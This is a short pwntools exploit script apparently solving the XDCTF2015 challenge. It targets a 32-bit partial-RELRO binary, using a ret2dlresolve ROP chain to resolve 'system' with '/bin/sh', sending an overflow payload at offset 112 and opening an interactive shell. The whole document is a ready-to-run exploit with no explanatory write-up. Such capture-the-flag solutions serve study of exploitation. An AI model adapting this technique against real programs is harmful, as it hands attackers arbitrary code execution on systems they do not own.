from pwn import *
context.binary = elf = ELF("./main_partial_relro_32")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
# pwntools will help us choose a proper addr
# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io = process("./main_partial_relro_32")
io.recvuntil("Welcome to XDCTF2015~!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()